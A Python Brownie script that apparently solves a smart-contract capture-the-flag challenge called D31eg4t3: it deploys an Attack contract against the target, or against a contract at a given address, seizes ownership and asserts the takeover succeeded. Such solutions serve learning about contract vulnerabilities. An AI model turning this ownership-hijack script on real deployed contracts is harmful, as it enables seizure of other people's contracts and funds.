#!/usr/bin/python3
from brownie import D31eg4t3, Attack, web3
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def hack(contract_address=None, attacker=None):
    if not contract_address:
        D31eg4t3_contract, _ = deploy()
        _, attacker = get_account()
        contract_address = D31eg4t3_contract.address
    else:
        D31eg4t3_contract = D31eg4t3.at(contract_address)

    prev_owner = D31eg4t3_contract.owner()

    attacker_contract = Attack.deploy(contract_address, {"from": attacker})
    
    # #* abi.encodeWithSignature("attack(address)", msg.sender)
    # data = attacker_contract.attack.encode_input(attacker)
    # print(data)

    attacker_contract.startAttack({"from": attacker})

    print(f"{green}D31eg4t3 perv owner: {blue}{prev_owner}{reset}")
    print(f"{green}D31eg4t3 owner: {blue}{D31eg4t3_contract.owner()}{reset}")

    # print(f"attacker: {attacker}")
    print(f"{green}Can you hack: {red}{D31eg4t3_contract.canYouHackMe(attacker)}{reset}")

    assert D31eg4t3_contract.owner() == attacker

def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()

if __name__ == "__main__":
    main()